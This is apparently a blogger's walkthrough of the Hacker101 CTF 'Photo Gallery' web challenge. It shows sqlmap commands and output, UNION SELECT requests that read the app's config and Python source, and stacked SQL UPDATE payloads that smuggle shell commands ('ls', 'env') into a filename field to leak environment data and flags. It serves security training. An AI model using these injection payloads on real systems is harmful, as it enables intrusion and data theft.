---
title: Hacker101 CTF Photo Gallery [moderate] writeup
subtitle: a write up for this web challenge
description: A write up for the Photo Gallery [moderae] challenge
published: true
datePublished: 1609676431536
author: lwlx
authorTwitter: "0x0000005"
authorPhoto: /profile.jpg
tags:
  - ctf
  - writeup
  - hackerone
  - hacker101
  - security
thumbnailPhoto: /hackerone/hackerone.png
bannerPhoto: /hackerone/hackerone.png
canonicalUrl:
---

# Photo Gallery _[moderate]_

This is my Write Up for the "Photo Gallery" challenge of HackerOne's CTF.

As usual we get a link to webpage, it seems to be an image gallery, but one of the images is broken.
The missing one is called `Invisible`, so lets look into that.

```
http://34.74.105.127/ad3e8c7df9/
```

![initial page](/hackerone/photogallery-start.png "initial page")

## Information gathering

with Burp we were able to find that the server returns no content for this image.
images are loaded with a `GET` Request to the server like so:

`GET /ad3e8c7df9/fetch?id=1 HTTP/1.1`

this also aligns with the first tip we are provided:

> Hint 1: _Consider how you might build this system yourself. What would the **query for fetch** look like?_

naturally we start fuzzing the `id` parameter.

```python
GET /ad3e8c7df9/fetch?id=4 HTTP/1.1 # 404
GET /ad3e8c7df9/fetch?id=0 HTTP/1.1 # 404
GET /ad3e8c7df9/fetch?id=-1 HTTP/1.1 # 500
```

alright, no quick wins, so let's give it a try with fizzing using sqlmap.
Quickly we are able to see that the server seems to be vulnerable to some attack.

```python
sqlmap -u "http://34.74.105.127/ad3e8c7df9/fetch?id=2"
```

This command runs for quite a while and will try to find vulnerabilities in the fetch endpoint.
when we are done we should know what to do next.

## Gathered Data

### sqlmap identified the following injection point(s) with a total of 311 HTTP(s) requests:

```python
Parameter: id (GET)
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: id=2 AND 3567=3567

Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: id=2 AND (SELECT 8480 FROM (SELECT(SLEEP(5)))KHRS)
```

```python
[21:44:44] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```

### Our Target Server:

    | Type      | Service      | Version                  | Vulnerable?    |
    | --------- | ------------ | ------------------------ | -------------- |
    | OS        | Linux Ubuntu | ??                       | not focused    |
    | Webserver | Nginx        | 1.14.0                   | no             |
    | Database  | MySQL        | >= 5.0.12 (MariaDB fork) | yes (id param) |

Good, we got something, we know the server is vulnerable to multiple vulnerabilities such as a 'boolean base blind'. We also found the Webserver is Nginx v1.14.0, which sadly has no usable vulnerabilities here. But with us now knowing the exact os and DB System used lets run sqlmap again with that info and see what we get.

```python
sqlmap -u "http://34.74.105.127/ad3e8c7df9/fetch?id=2" -f --os=linux --dbms=mysql --level=3 -o
```

we dont really get any more useful information from here.
soo.. were kinda stuck lets just get another hint then:

> Hint 2: _Take a few minutes to consider the **state of the union**_

The state uf the union? are they hinting on using UNION statements in the query?
_The UNION operator is used to combine the result-set of two or more SELECT statements._
That seems like somethng we can make use of, so lets try and combine our query statements f.e. like this:

`http://34.74.105.127/ad3e8c7df9/fetch?id=2 UNION SELECT 'something'`

but what do we look for? Lets get another hint.

> Hint 3: _This application runs on the **uwsgi-nginx-flask-docker** image_

uwsgi-nginx? hmm havent heard of that, but sems to be some kind of portable all in one flask. lets look for the docs.

https://uwsgi-docs.readthedocs.io/en/latest/Configuration.html#ini-files

> uWSGI can be configured using several different methods.

YAML, JSON, INI are some supported formats -> ini beeing the defualt so lets try getting the 'uwsgi.ini' file?

![union select wiht burp repeater](/hackerone/union-select-ini.png "union select wiht burp repeater")

this returns us some configdata pointing to module main which is the entrypoint.

```python
[uwsgi]
module = main
callable = app
```

so lets see if we can also fethc the main.py

```python
http://35.190.155.168/c947e97f6e/fetch?id=4%20UNION%20SELECT%20%27main.py%27--
```

Here we get lots of infos our **first FLAG** and the db connection settings:

### FLAG 0:

```python
%s
' % (pid, sanitize(ptitle)) fns.append(pfn) rep += 'Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '' rep += '
\n' return home.replace('$ALBUMS$', rep) @app.route('/fetch') def fetch(): cur = getDb().cursor() if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0: abort(404)
# It's dangerous to go alone, take this: # ^FLAG^9e6d57c394c129??????????????????????????????f74dbf2faa0abd571b32c7$FLAG$ return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read() if __name__ == "__main__": app.run(host='0.0.0.0', port=80)
```

`return MySQLdb.connect(host="localhost", user="root", password="", db="level5")`

we also see that they are using the photos table

`cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))`

lets try to fuzz that with sqlmap, since we now know the DB and tables info we can launch a targeted attack.

```python
sqlmap -u "http://34.74.105.127/ad3e8c7df9/fetch?id=1" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 2
```

This can take quite a while.. for me it crashed after 40 minutes, so i gave it another go with just focusing on the column `filename` since, here is the value we need.we do this by adding the -C parameter, i also increased the thradcount to 4 to try and get faster results. I also changed the url to contain id=3 since this is the id we want to get the info from.

```python
sqlmap -u "http://35.190.155.168/c947e97f6e/fetch?id=3" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 4 -C filename
```

This means that sqlmap will start with the filename of id=3 which is exactly what we want right now.

![starts to query filename of id 3](/hackerone/photo-gallery-hash.png "query on the filename of id 3")
So lets have a look at our results:

```python
Database: level5
Table: photos
[3 entries]
+------------------------------------------------------------------+
| filename |
+------------------------------------------------------------------+
| 9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa |
| files/adorable.jpg |
| files/purrfect.jpg |
+------------------------------------------------------------------+
```

> you might be getting partial values like so:
> `9ef8fc5di15625db993f1c8e120beafc6873d801a804670?????????????????`
> you should be able to re-run sqlmap to find the missing characters
> `9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa`

decrypted: `\*||+ls+-a+tmp.txt`
another file! nice lets try and get that with a UNION STATEMENT request like so:

`GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'tmp.txt'-- HTTP/1.1`
hmm no luck it seems... let's do it another way.

From our previous findings we know that files are in the 'files' directory and that we can run sql statements on the id param. So we want to try to move the file or its contents so we can access it. We also got a new hint of using ls output to find temp file.

We want to run following statements via the vulnerable param:

#### ls in the /files directory and store data in bigWin.txt

`update photos set filename='* || ls ./files >bigWin.txt ' where id=3; commit;`

`GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename=%27\*%20||%20ls%20./files%20%3EbigWin.txt%20%27%20where%20id=3;%20commit;%20-- HTTP/1.1`

#### store all env data in bigWin.txt (because so often flags are here)

`update photos set filename='* || env >bigWin.txt' where id=3; commit;`

`GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename%3D%27*%20%7C%7C%20env%20%3Etmp.txt%27%20where%20id%3D3%3B%20commit%3B%20-- HTTP/1.1`

after you succsessfully ran those you should be able to run the union select again to get ahold of bigWin.txt!

`GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'bigWin.txt'-- HTTP/1.1`

Tadaa!! we got it all.

```bash
"^FLAG^9ef8fc5da15????????????????????????????????????????????782ca11fa$FLAG$"
"^FLAG^63a407d0083????????????????????????????????????????????4564ee9f2$FLAG$"
HOSTNAME=ad3e8c7df92d
SHLVL=0
```
